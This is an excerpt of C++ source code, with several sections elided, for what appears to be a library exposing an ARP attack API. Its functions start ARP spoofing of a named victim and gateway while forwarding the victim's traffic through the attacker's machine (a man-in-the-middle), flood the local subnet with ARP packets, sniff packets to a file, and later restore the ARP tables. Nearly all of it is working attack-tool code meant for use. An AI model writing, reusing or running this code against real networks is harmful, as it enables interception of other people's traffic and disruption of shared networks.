...
static NetInterface ResolveDevice(const char *DevName) {
  if (DevName && DevName[0])
    return SelectInterface(DevName);
...
static pcap_t *OpenPcap(const NetInterface &Iface) {
  ...
  if (!Handle)
    SetError("pcap_open_live(%s): %s", Iface.Friendly.c_str(), ErrBuf);
  return Handle;
}
...
ARP_API ArpHandle ArpSpoofStart(const char *VictimIp, const char *GatewayIp,
                                const char *DevName, int IntervalMs,
                                int Forward) {
  if (!VictimIp || !VictimIp[0]) {
    SetError("VictimIp is required");
    return nullptr;
  }
  if (IntervalMs <= 0)
    IntervalMs = 2000;
  auto Iface = ResolveDevice(DevName);
  if (Iface.IpAddr.empty()) {
    SetError("No suitable network interface found");
    return nullptr;
  }
  std::string GwStr;
  if (GatewayIp && GatewayIp[0])
    ...
    if (GwStr.empty() || GwStr == "0.0.0.0") {
      SetError("No gateway found, please specify GatewayIp");
      return nullptr;
    }
  }
  ...
  if (!ResolveMac(Pcap, MyMac, Iface.IpAddr, VictimIp, VicMac)) {
    SetError("Failed to resolve victim MAC for %s", VictimIp);
    pcap_close(Pcap);
    return nullptr;
  }
  if (!ResolveMac(Pcap, MyMac, Iface.IpAddr, GwStr.c_str(), GwMac)) {
    SetError("Failed to resolve gateway MAC for %s", GwStr.c_str());
    pcap_close(Pcap);
    return nullptr;
  }
  bool WasOn = GetIpForwardStatus(Iface.Index);
  if (!WasOn && Forward == 1)
    EnableIpForward(Iface.Index);
  if (Forward == 0)
    DisableIpForward(Iface.Index);
  auto *Ctx = new ArpHandleCtx();
  Ctx->Type = HandleType::Spoof;
  Ctx->Pcap = Pcap;
  Ctx->IfIndex = Iface.Index;
  Ctx->IpFwdWasOn = WasOn;
  SpoofParams Sp;
  Sp.Handle = Pcap;
  memcpy(Sp.MyMac, MyMac, 6);
  memcpy(Sp.VictimMac, VicMac, 6);
  Sp.VictimIp = IpToU32(VictimIp);
  memcpy(Sp.GatewayMac, GwMac, 6);
  Sp.GatewayIp = IpToU32(GwStr.c_str());
  Sp.IntervalMs = IntervalMs;
  Ctx->Spoofer = new ArpSpoofer(Sp);
  Ctx->Spoofer->start();
  FwdParams Fp;
  Fp.Handle = Pcap;
  memcpy(Fp.MyMac, MyMac, 6);
  memcpy(Fp.VictimMac, VicMac, 6);
  Fp.VictimIp = IpToU32(VictimIp);
  memcpy(Fp.GatewayMac, GwMac, 6);
  Fp.GatewayIp = IpToU32(GwStr.c_str());
  Ctx->Forwarder = new PacketForwarder(Fp);
  Ctx->Forwarder->start();
...
ARP_API ArpHandle ArpFloodStart(const char *DevName, int Rate) {
  ...
  MacStrToBytes(Iface.MacAddr, MyMac);
  auto *Ctx = new ArpHandleCtx();
  Ctx->Type = HandleType::Flood;
  Ctx->Pcap = Pcap;
  FloodParams Fp;
  Fp.Handle = Pcap;
  memcpy(Fp.MyMac, MyMac, 6);
  Fp.SubnetIp = IpToU32(Iface.IpAddr) & IpToU32(Iface.Netmask);
  Fp.SubnetMask = IpToU32(Iface.Netmask);
  Fp.Rate = Rate;
  Ctx->Flooder = new ArpFlooder(Fp);
  Ctx->Flooder->start();
  return reinterpret_cast<ArpHandle>(Ctx);
}
...
ARP_API ArpHandle ArpSniffStart(const char *DevName, const char *Filter,
  ...
  if (!Pcap)
    return nullptr;
  auto *Ctx = new ArpHandleCtx();
  Ctx->Type = HandleType::Sniff;
  Ctx->Pcap = Pcap;
  SniffParams Snp;
  Snp.Handle = Pcap;
  Snp.Filter = Filter ? Filter : "";
  Snp.OutFile = OutFile ? OutFile : "";
  Snp.Verbose = (Verbose != 0);
  Ctx->Sniffer = new Sniffer(Snp);
  Ctx->Sniffer->start();
  return reinterpret_cast<ArpHandle>(Ctx);
}
...
ARP_API int ArpIsRunning(ArpHandle Handle) {
  ...
  switch (Ctx->Type) {
  case HandleType::Spoof:
    return (Ctx->Spoofer && Ctx->Spoofer->IsRunning()) ? 1 : 0;
  case HandleType::Flood:
    return (Ctx->Flooder && Ctx->Flooder->IsRunning()) ? 1 : 0;
  case HandleType::Sniff:
    return (Ctx->Sniffer && Ctx->Sniffer->IsRunning()) ? 1 : 0;
  default:
    return 0;
  }
}
...
ARP_API uint64_t ArpGetFwdCount(ArpHandle Handle) {
  ...
  switch (Ctx->Type) {
  case HandleType::Spoof:
    return Ctx->Forwarder ? Ctx->Forwarder->FwdCount() : 0;
  case HandleType::Flood:
    return Ctx->Flooder ? Ctx->Flooder->SentCount() : 0;
  default:
    return 0;
  }
}
...
ARP_API uint64_t ArpGetPktCount(ArpHandle Handle) {
  if (!Handle)
    return 0;
  auto *Ctx = reinterpret_cast<ArpHandleCtx *>(Handle);
  return (Ctx->Type == HandleType::Sniff && Ctx->Sniffer)
             ? Ctx->Sniffer->PktCount()
             : 0;
}
...
ARP_API void ArpStop(ArpHandle Handle) {
  if (!Handle)
    return;
  auto *Ctx = reinterpret_cast<ArpHandleCtx *>(Handle);
  if (Ctx->Spoofer && Ctx->Spoofer->IsRunning())
    Ctx->Spoofer->stop();
  if (Ctx->Forwarder && Ctx->Forwarder->IsRunning())
    Ctx->Forwarder->stop();
  if (Ctx->Flooder && Ctx->Flooder->IsRunning())
    Ctx->Flooder->stop();
  if (Ctx->Sniffer && Ctx->Sniffer->IsRunning())
    Ctx->Sniffer->stop();
  if (Ctx->Spoofer)
    Ctx->Spoofer->restore(5);
  delete Ctx->Sniffer;
  delete Ctx->Forwarder;
  delete Ctx->Flooder;
  delete Ctx->Spoofer;
  if (!Ctx->IpFwdWasOn)
    DisableIpForward(Ctx->IfIndex);
  if (Ctx->Pcap)
    pcap_close(Ctx->Pcap);
  delete Ctx;
}

ARP_API int ArpRestore(const char *VictimIp, const char *GatewayIp,
                       const char *DevName) {
  if (!VictimIp || !VictimIp[0] || !GatewayIp || !GatewayIp[0]) {
    SetError("VictimIp and GatewayIp required");
    return 0;
  }
  auto Iface = ResolveDevice(DevName);
  if (Iface.IpAddr.empty()) {
  ...
  MacStrToBytes(Iface.MacAddr, MyMac);
  if (!ResolveMac(Pcap, MyMac, Iface.IpAddr, VictimIp, VicMac)) {
    SetError("Failed to resolve victim MAC");
    pcap_close(Pcap);
    return 0;
  }
  if (!ResolveMac(Pcap, MyMac, Iface.IpAddr, GatewayIp, GwMac)) {
    SetError("Failed to resolve gateway MAC");
    pcap_close(Pcap);
    return 0;
  }
  for (int I = 0; I < 5; I++) {
